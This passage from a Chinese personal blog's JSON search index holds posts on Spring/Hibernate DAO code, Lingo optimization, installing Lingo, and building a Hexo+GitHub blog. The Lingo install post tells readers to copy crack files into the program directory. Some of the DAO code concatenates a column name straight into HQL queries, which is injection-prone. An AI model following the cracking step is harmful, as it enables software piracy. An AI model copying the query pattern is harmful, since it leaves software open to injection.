-&gt; apply -&gt; 出来后重新刷新如果依然有错就将strutss2进行remove build path然后重新添加 Caused by: java.lang.ClassNotFoundException: com.mchange.v2.ser.Indirector解决方案：在官网下载一个mchange-commons-java的jar文件，然后build path并添加到lib中，这样就能配置到项目中了，错误也就消失了，想这种错误都是缺少jar包，只需要下载并配置即可解决 4. HibernateDaoSupport支持类 以上实现的SSH整合是在Spring3.x被迫形成的，因为从最早的Spring2和现在的Spring4都会提供一个HibernateDaoSupport类，利用这个类结合HibernateTemplate操作模板就可以轻松地实现，HibernateDaoSupport类里面提供的一系列的操作方法还可以简化Hibernate的编写难度。 在org.springframework.orm.hibernate4.support.HibernateDaoSupport里提供有如下方法： |- 构造方法：public HibernateDaoSupport(); |- 设置Hibernate操作模板：public final void setHibernateTemplate(HibernateTemplate hibernateTemplate); |- 取得Hibernate操作模板：public final HibernateTemplate getHibernateTemplate(); 如果要想使用这个操作则需要清楚HibernateTemplate的定义，有如下一些方法： |- 构造方法：public HibernateTemplate(); |- 设置SessionFactory：public void setSessionFactory(SessionFactory sessionFactory); 同时在HibernateTemplate中提供有一些列的简化Hibernate操作的方法。 4.1 利用HibernateDaoSupport实现操作4.1.1 修改applicationContext.xml文件123&lt;bean id=\"hibernateTemplate\" class=\"org.springframework.orm.hibernate4.HibernateTemplate\"&gt; &lt;property name=\"sessionFactory\" ref=\"sessionFactory\"/&gt;&lt;/bean&gt; 4.1.2 定义NewsDaoImpl子类的时候使用这个操作 extends HibernateDaoSupport 不再使用SessionFactory，而是使用HibernateTemplate 1234567@Autowired public NewsDAOImpl(HibernateTemplate ht) &#123; super.setHibernateTemplate(ht); &#125; // @Resource// private SessionFactory sessionFactory; 然后将处理方法中的this.sessionFactory改为super.getHibernateTemplate…… 更改后的NewsDaoImpl.java类如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596package com.tianxingjian.dao.impl;import java.util.Iterator;import java.util.List;import java.util.Set;import org.hibernate.Query;import org.hibernate.criterion.DetachedCriteria;import org.hibernate.criterion.Restrictions;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.orm.hibernate4.HibernateTemplate;import org.springframework.orm.hibernate4.support.HibernateDaoSupport;import org.springframework.stereotype.Component;import com.tianxingjian.dao.INewsDAO;import com.tianxingjian.pojo.News;@Componentpublic class NewsDAOImpl extends HibernateDaoSupport implements INewsDAO &#123; @Autowired public NewsDAOImpl(HibernateTemplate ht) &#123; super.setHibernateTemplate(ht); &#125; // @Resource// private SessionFactory sessionFactory; @Override public boolean doCreate(News vo) throws Exception &#123; return super.getHibernateTemplate().save(vo) != null;// return sessionFactory.getCurrentSession().save(vo) != null; &#125; @Override public boolean doUpdate(News vo) throws Exception &#123; String hql = \"update News set title=?, date=?, content=? where nid=?\";// Query query = super.getHibernateTemplate().createQuery(hql); Query query = super.getHibernateTemplate().getSessionFactory().getCurrentSession().createQuery(hql); query.setParameter(0, vo.getTitle()); query.setParameter(1, vo.getDate()); query.setParameter(2, vo.getContent()); query.setParameter(3, vo.getNid()); return query.executeUpdate() &gt; 0; &#125; @Override public News getElementById(Integer id) throws Exception &#123; return super.getHibernateTemplate().get(News.class, id);// return (News) this.sessionFactory.getCurrentSession().get(News.class, id); &#125; @Override public boolean doRemoveBatch(Set&lt;Integer&gt; ids) throws Exception &#123; StringBuffer buffer = new StringBuffer(); buffer.append(\"delete from News where nid in (\"); Iterator&lt;Integer&gt; iterator = ids.iterator(); while (iterator.hasNext()) &#123; buffer.append(iterator.next()).append(\",\"); &#125; buffer.delete(buffer.length()-1, buffer.length()).append(\")\"); Query query = super.getHibernateTemplate().getSessionFactory().getCurrentSession().createQuery(buffer.toString());// Query query = this.sessionFactory.getCurrentSession().createQuery(buffer.toString()); return query.executeUpdate() &gt; 0; &#125; @SuppressWarnings(\"unchecked\") @Override public List findAll() throws Exception &#123; DetachedCriteria dc = DetachedCriteria.forClass(News.class); return super.getHibernateTemplate().findByCriteria(dc);// Criteria criteria = this.sessionFactory.getCurrentSession().createCriteria(News.class);// return criteria.list(); &#125; @SuppressWarnings(\"unchecked\") @Override public List findAllSplit(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception &#123; DetachedCriteria dc = DetachedCriteria.forClass(News.class); dc.add(Restrictions.ilike(column, \"%\" + keyWord + \"%\")); return super.getHibernateTemplate().findByCriteria(dc, (currentPage-1)*lineSize, lineSize);// String hql = \"from News as n where n.\" + column + \" like ?\";// Query query = this.sessionFactory.getCurrentSession().createQuery(hql);// query.setParameter(0, \"%\" + keyWord + \"%\");// query.setFirstResult((currentPage-1)*lineSize);// query.setMaxResults(lineSize);// return query.list(); &#125; @Override public Integer getAllCount(String column, String keyWord) throws Exception &#123; String hql = \"select count(*) from News as n where n.\" + column + \" like ?\"; Long count = (Long) super.getHibernateTemplate().find(hql, \"%\" + keyWord + \"%\").get(0);// Query query = this.sessionFactory.getCurrentSession().createQuery(hql);// query.setParameter(0, \"%\" + column + \"%\");// Long count = (Long) query.uniqueResult(); return count.intValue(); &#125;&#125; 4.2 HibernateDaoSupport使用总结 使用HibernateDaoSupport的时候感觉似乎也并没有简单什么， 以上是两种操作方式，分别是使用SessionFactory和HibernateDaoSupport，这两个种基本都差不多，即在实际开发中这两种方法可根据自己的喜好来使用。 5. 使用MyEclipse进行SSH项目整合总结 以上便是此次利用MyEclipse进行SSH项目整合总结，感觉今天的学习效率很低，一天下来只是学了这个部分的内容，而且并不是说今天之后就被完全吸收，在之后的学习过程中还是需要不断的进行反反复复的温习。 学习时间：2018-07-17","path":"2018/09/20/利用MyEclipse进行SSH项目整合/"},{"title":"Lingo解决优化问题","text":"前言前面，我们已经对Lingo有了一定的了解，但是要想真正的熟悉Lingo在解决优化问题中的强大之处，还需要不断加强相关训练，本文主要是使用Lingo来解决优化问题，该文的主要目的有以下三点： 希望能够提升自己对Lingo的相关操作并加强对优化问题的思维模式 方便日后对Lingo核心操作的回顾 希望每一位到来的朋友能够有所收获 若您对Lingo的安装及基本操作不是很了解，可暂且移步：Lingo安装、Lingo基本操作 优化模型介绍优化模型主要有三个基本要素：决策变量、目标函数、约束条件。其一般形式如下： opt \\ \\ \\ \\ f(x) \\\\ s.t \\ \\ \\ \\ h_i(x)=0,\\ i=1,2,\\cdots,m \\\\ g_j(x)\\leq0,\\ j=1,2,\\cdots,l$opt$ 是“optimize”的缩写，表示“最优化”，一般为 $min$ 或 $max$，$f(x)$ 表示目标函数，$s.t.$ 是“subject to”的缩写“受约束于”，$h_i(x), g_i(x)$ 则表示约束条件，其中 $x$ 表示优化模型的决策变量。 运输问题问题描述 Question：有三个生产地和四个销售地，其生产量、销售量及单位运费如表所示，求总运费最少的运输方案以及总运费。 问题分析由题意，我们不难看出优化模型的决策变量是每个生产地向各个销售地运输的货量，即 $s_{ij}$。运输的总费用由各个产地向各个销售地运输所需费用之和，一个产地可以向多个销售地运输货物，一个销售地亦可接受多个产地的货物，所以可知优化模型中的目标函数是运输的总费用，即 $W=\\sum^3_{i=1}\\sum^4_{j=1}s_{ij}x_{ij}$。除此之外，该目标函数受到两个限制，即优化模型的约束条件： 生产地限制：每个生产地的运输量理应小于产生量，$\\sum_{j=1}^4s_{ij}\\leq a_i$ 销售地限制：每个销售地接受的货物理应等于销售量，$\\sum_{i=1}^3x_{ij}=b_j$ 优化模型构建有以上问题分析，为求出总运费最小的方案，我们可以构建该问题的优化模型如下： min \\ \\ \\ \\ \\sum^3_{i=1}\\sum^4_{j=1}s_{ij}x_{ij} \\\\ s.t. \\ \\ \\ \\ \\sum_{j=1}^4s_{ij}\\leq a_i \\;;\\ \\sum_{i=1}^3x_{ij}=b_j \\ ;\\ s_{ij}\\geq0 \\ ;模型求解求解的Lingo代码如下： 1234567891011121314151617sets:supply/1..3/: a;demand/1..4/: b;link(supply, demand): c, x;endsetsdata:a = 30,25,21;b = 15,17,22,12;c = 6,2,6,7, 4,9,5,3, 8,8,1,5;enddatamin = @sum(link(i,j): c(i,j) * x(i,j));@for(supply(i): @sum(demand(j): x(i,j)) &lt;= a(i));@for(demand(j): @sum(supply(i): x(i,j)) = b(j)); 求解结果运行如上所示Lingo程序，我们可以得到如下结果： 通过上图展示，我们可以得到运输的最佳方案以及最小运费161个单位。运输方案图示如下： 待续","path":"2018/09/14/Lingo解决优化问题/"},{"title":"Lingo基本操作","text":"前言Lingo是一门主要求解非线性规划数学模型的编程软件，记得最初接触Lingo是在阅读《数学建模教程》一书，该书在第五章主要讲解使用Lingo来解决优化问题，也是在那个时候认识到了Lingo的强大之处。Lingo的使用就好比解决一道简单的数学问题，而你只需要使用Lingo支持的编程规范给其提供充足的已知条件即可，之后会自动使用相关算法为您解答。为了日后更加方便的查询Lingo相关知识，所以将Lingo的基本使用在此记录。 关于Lingo的下载及安装问题鄙人已做整理，可参考本篇教程 Lingo安装 Lingo基本运算符算术运算符^：乘方*：乘/：除+：加-：减 逻辑运算符在Lingo中，逻辑运算符主要用于集循环函数的条件表达式中，来控制在函数中哪些集成员被包含，哪些被排斥。 符号 说明 #and# 且，&amp; #or# 或，\\ \\ #not# 非，! #eq# 等于，== #ne# 不等于，!= #gt# 大于，&gt; #ge# 大于等于，&gt;= #lt# 小于，&lt; #le# 小于等于，&lt;= 关系运算符= 、&lt;= 、 &gt;= 函数标准数学函数 函数 说明 @abs(x) 绝对值 @sin(x) 正弦值，采用弧度制 @cos(x) 余弦值 @tan(x) 正切 @exp(x) 指数，$e^x$ @log(x) 自然对数 @lgm(x) gamma函数的自然对数 @sign(x) x&lt;0返回-1，否则返回返回1 @floor(x) 取整 @smax($x_1,x_2,\\cdots,x_n$) 取($x_1,x_2,\\cdots,x_n$) 中的最大值 @smin($x_1,x_2,\\cdots,x_n$) 取($x_1,x_2,\\cdots,x_n$) 中的最小值 集循环函数集循环函数用于遍历整个集，其基本语法如下： 12@function(setname[(set_index_list)[|conditional_qualifier]]:expression_list); @function相应于下面罗列的四个集循环函数之一；setname是要遍历的集；set_ index_list是集索引列表；conditional_qualifier是用来限制集循环函数的范围，当集循环函数遍历集的每个成员时，LINGO都要对conditional_qualifier进行评价，若结果为真，则对该成员执行@function操作，否则跳过，继续执行下一次循环。expression_list是被应用到每个集成员的表达式列表，当用的是@for函数时，expression_list可以包含多个表达式，其间用逗号隔开。这些表达式将被作为约束加到模型中。当使用其余的三个集循环函数时，expression_list只能有一个表达式。如果省略set_index_list，那么在expression_list中引用的所有属性的类型都是setname集。 @for@for函数用来对集中的成员形成约束。 例：产生序列[1,4,9,16,25] 12345sets:nums/1..5/: x;endsets@for(nums(i): x(i)=i^2); @sum@sum函数返回遍历指定集成员的一个表达式的和 例：求[1,2,3,4,5,6,7]中前五个数的和 1234567sets:nums/1..7/: x;endsets@for(nums(i): x(i)=i);s = @sum(nums(i) | i #le# 5: x(i)); @max，@min这两个函数分别用于返回指定集成员的一个表达式的最大值和最小值 例：求[1,2,3,4,5,6,7,8,9,10]中前五个数的最大值，后五个数的最小值 12345678sets:nums/1..10/: x;endsets@for(nums(i): x(i)=i);min_value = @max(nums(i) | i #le# 5: x);max_value = @min(nums(i) | i #ge# 6: x); 变量界定函数该函数主要是对决策变量做附加限制，一般用于@for函数中，主要有如下四种： 函数 说明 @bin(x) 限制x为0或1 @bnd(a,x,b) 限制x取a到b之间的值 @free(x) x取实数 @gin(x) x取整数 说明 Lingo中还有其他大量的函数，比如金融函数、概率函数、变量界定函数，由于目前鄙人暂时用不上，所以就暂且不记录了，待需要时再做进一步更新。 待更新","path":"2018/09/14/Lingo基本操作/"},{"title":"Lingo安装","text":"Lingo简介&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LINGO是Linear Interactive and General Optimizer的缩写，即“交互式的线性和通用优化求解器”，由美国LINDO系统公司（Lindo System Inc.）推出的，可以用于求解非线性规划，也可以用于一些线性和非线性方程组的求解等，功能十分强大，是求解优化模型的最佳选择。其特色在于内置建模语言，提供十几个内部函数，可以允许决策变量是整数（即整数规划，包括 0-1 整数规划），方便灵活，而且执行速度非常快。能方便与EXCEL，数据库等其他软件交换数据。 Lingo安装 Lingo下载地址：点击我&nbsp;&nbsp;&nbsp;&nbsp;密码：r6cy 下载到本地并解压后可见以下文件 双击运行LINGO-WINDOWS-IA32-12.0.exe可执行文件 单击Next 单击I accept 并Next 更改安装目录，Next 点击Only For Me，出现后续窗口点击OK 取消Launch，并Finish 打开“lingo12破解文件”并复制所有文件粘贴至Lingo所在目录 安装完成 安装声明&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;提供的安装文件皆来自网络共享资源，若想更好的体验请支持正版,Lingo官网下载地址:点击我。如内容有侵犯您的版权或利益的请联系QQ：26647879,WX：LT510087153，鄙人见后会在第一时间进行处理。","path":"2018/09/13/Lingo安装/"},{"title":"Hexo+Github建站","text":"前言gitHub是一个面向开源及私有软件项目的托管平台，也是版本控制库因为只支持git 作为唯一的版本库格式进行托管，故名gitHub。此后，2018年6月4日，微软宣布，通过75亿美元的股票交易收购代码托管平台GitHub。Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 官网：Github：https://github.com/Hexo：https://hexo.io/zh-cn/docs/ 以上摘自官方解释 作为一位Coder，一直想找个安静的地方沉淀一下自己，记录自己学习的过程并分享所走过的坑。网上也有各种各样的建站方法，例如WordPress、emlog、Typecho等等平台。但是绝大多数的平台的使用都避免不了备案等一系列的困扰，对于懒癌患者来说无疑是一大痛病，通过海量信息的层层筛选，鄙人最终发现Hexo+Github能够很好的满足大多数人的要求，既简单又美观，使用它来搭建属于自己的个人博客再好不过了。如果你有也有建站的想法的话，那么以下内容将记录了我搭建过程所走的坑，或许能够帮助到你，久而久之，你还会发现其中还有很多有意思的美化操作。 以下的搭建过程是针对小白所实现的，例如github仓库的创建、环境变量的配置、git终端等一些基础操作都有较为详细的说明。由于鄙人语言功底不行，如果有拗口、错别字、歧义或者不解的地方可在文章末端或右方的Gitalk留言，博主看到会第一时间解释，在此谢过。 一、搭建环境环境介绍： windows系统。系统根据自己的需要准备即可，mac、linux皆可，本文以windows系统环境下搭建为例。 git。安装之后方便使用各种命令，还能够更好的clone github仓库。 node.js。一个Javascript运行环境，网站的搭建必须建立在这个框架之上。 Hexo。使用命令可以直接将Hexo生成的静态资源存储到Github上，然后使用自己的github账户即可访问。 安装：Git的安装：你可在git官网中根据自己的需要进行下载：https://git-scm.com/。打开之后你将看到如下内容： 将其下载到指定的磁盘，然后傻瓜式安装即可。安装好后打开cmd终端，执行git --version，若出现git version 2.19.2.windows.1之类的输出则说明已经成功安装。 node.js的安装：node.js的安装和Git的安装如出一辙，同样的操作下载node.js并安装即可，安装好后我们在cmd终端使用node -v命令，如出现v10.13.0类似输出，则说明已经成功安装。node.js下载：https://nodejs.org/en/ github注册进入github的注册页面：https://github.com/ 然后根据流程填写相应的信息即可。 二、博客搭建创建仓库并部署注册了github之后，我们需要创建一个仓库来存储我们的网站源码，创建的仓库名也就是我们博客访问的url地址，该url是采用子域名的方式，其一般形式为：1XXX.github.io 上面的XXX一般代表着你注册时的github用户名，所以在你注册之后该仓库名一般是固定的，仓库的创建及部署流程如下： 进入个人github主页之后点击New repository来创建仓库，如下： 之后按照如下内容进行创建 完成以上操作之后，你就已经成功创建好了自己的仓库。这时我们需要利用git命令来生成秘钥。鼠标右键桌面选择git bash here，然后在git终端执行以下命令：1ssh-keygen -t rsa -C XXX@XXX.com 其中XXX@XXX.com指的是你注册github时候使用的邮箱，在命令执行的时候回有一些yes、no的选择，直接默认回车即可，最终你将会看到类似如下内容：1234Your identification has been saved in /c/Users/you/.ssh/id_rsa.Your public key has been saved in /c/Users/you/.ssh/id_rsa.pub.The key fingerprint is:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx your_email@example.com 之后你将在c/Users/you/.ssh/id_rsa.pub路径文件看到生成的秘钥对，这个文件我们暂且打开，之后复制粘贴会用到。 补充：打开git bash here之后我们首先需要配置一下个人信息，在git终端分别配置自己的用户名和邮箱。命令如下：12git config --global user.name XXX # XXX表示你github注册时的用户名git config --global user.email XXX # XXX表示你github注册时的邮箱 之后我们需要将ssh key添加到我们的github账户。在个人github主页找到settings，然后点击SSH and GPG keys，之后再出现的页面的中点击New SSH key，随后根据如下图操作进行添加ssh key： 打开git bash here，执行ssh -T git@github.com，之后会出现一系列的问题，我们只需要回答yes即可，最终会输出如下类似内容： 1Hi username! You've successfully authenticated OK，完成以上流程后，你的本机就可以连接github了。 Hexo博客框架的搭建在完成以上操作后，我们就可以来使用Hexo了，你可通过如下操作来进行。 在以上操作的基础上，我们首先安装一下hexo。根据自己的需要在磁盘中创建一个名为Hexo文件夹，为了更好的管理文件，鄙人是在E盘的根目录中创建改文件夹的。之后进入该文件并在当前路径下打开git bash here，依次运行如下命令来进行创建：12npm install hexo-cli -gnpm install hexo --save 执行完成之后，你会发现在该目录之下会有个node_modules文件夹生成，如此一来，你就已经安装好了Hexo，离终点又近了一点 (*￣rǒ￣) 以上的node_modules文件生成之后，我们需要配置一下Hexo的环境变量，以便在cmd中可以直接执行后续博客操作的命令。进入到node_module文件夹下的bin目录，然后复制该bin目录的路径，如下： 后面的添加环境变量的操作比较简单，所以就描述一些流程，就不贴图了。如果有遇到问题的可联系鄙人。后续操作描述如下：1. ctrl+D切换到桌面。2. 右键此电脑，打开属性。3. 点击左侧的高级系统设置。 4. 点击环境变量。5. 在用户变量或者系统变量中找到Path并双击它（推荐更改用户变量）6. 双击之后点击新建，然后将以上的复制的bin目录粘贴至此。6. 然后一步一步的确定、确定、确定。OK，完成了，是不是很简单 (*￣rǒ￣)。 在以上操作完成之后，win+r，打开cmd终端，然后执行Hexo -v，若出现如下类似信息，则说明你的Hexo已经成功配置环境变量。 随后，我们需要创建我们的博客站点的主目录，你可使用我推荐的方式进行创建，当然你也可以根据自己的喜好方式进行创建。首先在E盘的根目录下创建ZerosBlog文件夹（自定义），然后进入该文件夹并创建XXX.github.io文件夹（该文件夹名必须与你之前创建的github仓库名一致，固定），进入到该目录右键点击git bash here来打开git终端，之后在该终端下根据如下命令一步步进行操作： 初始化hexo：1hexo init 自动安装网站所需组件：1npm install OK，至此，你已经基本完成了网站的建设，可以说是万事具备，只欠东风了。一个基本的Hexo博客框架已经完成了，我们需要导入自己的喜欢的主题即可正常使用了，主题的引入操作如下。 三、主题引入Hexo中有很多很多很多的主题（一个、两个、三个。。。 Σ( ° △ °|||)︴ 好吧，我不知道有多少个，因为他会被许多的大神更新着，如果好奇的话自行了解即可），其主题官网为：https://hexo.io/themes/，你可以在此观摩并使用任意一个来作为你博客的主题，但据统计，绝大多数使用hexo+github来搭建博客的都是使用NexT，它的“精于心，简于形”的简单美受到了许多人的青睐，所以以下将以NexT为例来作为我们主题的引入，当然，你也可以去阅读NexT的主题文档。 在Hexo主题页面ctrl+F并输入next查找到NexT主题，然后点击进入到NexT主题的github页面，该页面存储了NexT主题的源码，我们需要将其下载下来为己所用。在前面我们已经提到了git的最为方便之处就是可以随意clone github的资源，在这个操作就可以显露出来了 ┗|｀O′|┛ 嗷~~ ┗|｀O′|┛ 嗷~~ ┗|｀O′|┛ 嗷~~。 根据如下图所示复制出该主题的仓库链接： 复制好该链接后我们进入E:\\ZerosBlog\\XXX.github.io\\themes文件夹下，右键点击git bash here进入git终端，并执行如下命令，其中链接为你上一步所复制的内容1git clone https://github.com/theme-next/hexo-theme-next.git 如果你累了的话可以喝口茶，稍等片刻之后就会在该目录之下成功下载NexT主题了。 下载NexT主题后，我们需要配置来达到使用该主题的目的，该配置文件是属于站点的，其路径为E:\\ZerosBlog\\XXX.github.io\\_config.yml，我们用文本编辑器（notepad、notepad++、sublime text、Vim……）打开它，然后ctrl+f输入theme查找到theme属性，然后将值改为next，如下所示： 在NexT中已经为我们准备了四种博客样式，其配置文件在主题的配置文件中，即E\\ZerosBlog\\XXX.github.io\\themes\\next\\_config.yml文件，我们用文本编辑器（notepad、notepad++、sublime text、Vim……）打开它，然后ctrl+F输入scheme查找到如下内容：可以看见总共有四种主题Muse、Mist、Pisces、Gemini，你可以根据自己的喜好选择其中一种，然后将其他三种注释即可，ctrl+s保存然后退出 随后我们来到站点的根目录下，即E:\\ZerosBlog\\XXX.github.io，打开git终端，完成如下三步走命令 123hexo clean # 清除缓存heo g # 生成静态资源hexo d # 部署至github 在以上命令执行过程中，可能会遇到一个登陆表单的突然出现，我们只需要根据自己github注册时所填的信息进行登陆即可，命令执行完成之后我们的站点已经完成了部署并请求https://XXX.github.io/即可访问到自己的网站了，如下图所示： 四、总结以上的搭建过程是针对小白所实现的，例如github仓库的创建、环境变量的配置、git终端等一些基础操作都有较为详细的说明。由于鄙人语言功底不行，如果有拗口、错别字、歧义或者不解的地方可在文章末端或右方的Gitalk留言，博主看到会第一时间解释，在此谢过。 至此，已经完成了博客的搭建，但是我们左看看、右看看，不管怎么看都似乎显得有点单调，在之后将会介绍Hexo的基本命令和博客的美化，可以引入一些插件，比如像Gitalk在线聊天、APlayer、字数统计等一些插件。 OK，结束了。 2018-09-10,By Zero","path":"2018/09/10/Hexo-Github建站/"},{"title":"Begin","text":"关于本站既然这是本站的第一篇博文，首先得说下这个博客搭建的初衷： 好记性不如烂笔头，何况我根本没有好记性。记忆力这种东西就像内存，你渴望接受的东西越多需要记忆的量也就越大，所以会频繁性的造成遗忘之前所学所想的现象。当你某一天需要的时候，可能又会支付较大的时间成本才能再次捡起。所以希望能在本站记录一些自己的学习过程，以便日后的再次回顾。 记得在自己学习的时候，总会出现各种各样的玄学bug，而此时首先想到的就是去biadu、google、Stack Overflow等一些知名网站去寻找解决方法。然而令人崩溃的是这些解答大同小异，使用之后依然不能解决问题，原本一个小小的问题却需要花费大量的时间。所以希望来访的朋友都能够有所收获，在较短的时间内解决看起来不是问题的问题。 感觉拥有一个自己的个人博客很Cool，能够在这“为所欲为、畅所欲言”，而不像csdn、博客园那样的有所拘束。 可以说博主的语文那是相当差劲了，高考六七十分的选手（我也不知道为什么，考完之后明明感觉还行的），说多了都是泪啊 (ノへ￣、)。所以想在这个博客里锻炼一下自己的语言组织能力。 基于以上几点，所以就有了建站的想法。虽然之前花了将近20天使用Django、ssm后端框架 + 前端 + 各种插件来搭建过博客，但是为了避免备案、维护等困扰，所以最终选择了成熟的Hexo来实现。经过两天的坚持，最终本站才初见成色。 本站历程： 2018-09-05 使用Hexo+Next成功搭建个人博客系统的基本功能 (￣_,￣ ) 2018-09-10 添加鼠标点击出现爱心效果 o(*≧▽≦)ツ┏━┓ 2018-09-27 成功引入DaoVoice网页在线联系功能 ╰(°▽°)╯ 2018-10-10 在本站右下角添加Aplayer音乐系统 (ˉ▽￣～) 切~~ 关于我Zero是江西上饶的一位小伙子，现于上海就读，现实生活中比较内向、形单影只，但热衷于各种技术，学的东西也比较杂，目前正朝着极客的方向努力。至于未来发展的如何，一切都只是未知数，总而言之，言而总之，希望自己能够在这条道路上坚持下去。个人爱好： 动漫、code、音乐、乒乓球、棋牌 本人擅长Ai、Fw、Fl、Br、 Ae、Pr、Id、Ps等软件的安装与卸载，精通 CSS、JavaScript、PHP、ASP、C、C＋＋、 C#、Java、Ruby、Perl、Lisp、python、 Objective-C、ActionScript、Pascal等单词拼 写，熟悉Windows、Linux、Mac、 Android、IOS、WP8等系统的开关机……求一份设计相关的工作本人擅长Ai、Fw、Ps等软件的安装与卸载的工作 Contcat me： Email：26647978@qq.com QQ：26647879 VX：LT510087153 右方的DaoVoice在线联系 文末的Gitalk留言 友链添加最后，欢迎各位大佬互加友链，可在下方留言，友链互加事项及方式如下： 事项： 贵站需要保持一定的活跃度 贵站必须有10篇以上原创文章 贵站不在更新请及时联系本站 方式： 贵站将本站添加至友链后，可在下方Gitalk留言，附上贵站的链接及贵站主要分享类别即可。 本站须知 本站所有内容建议务必在PC端进行阅读，手机端的阅读效果可能不佳，也许会影响到您的阅读体验，给您带来不便敬请谅解。 本站部分所总结的内容涉及到Kali渗透，具有一定的攻击行为，所以仅供博主记录之用，切勿用于非法操作，一切后果由使用者本人自负。 本站所记录的内容没有特别标注的皆为博主日常学习所总结，欢迎各位的转载，转载时注明链接与作者即可。 本站转载文章会在醒目处留有说明，如有侵权还请联系。 如果本站内容能给你带来帮助那最好不过了，如果不喜欢的话也不要那个啥的，谢谢。","path":"2018/09/08/Begin/"}]}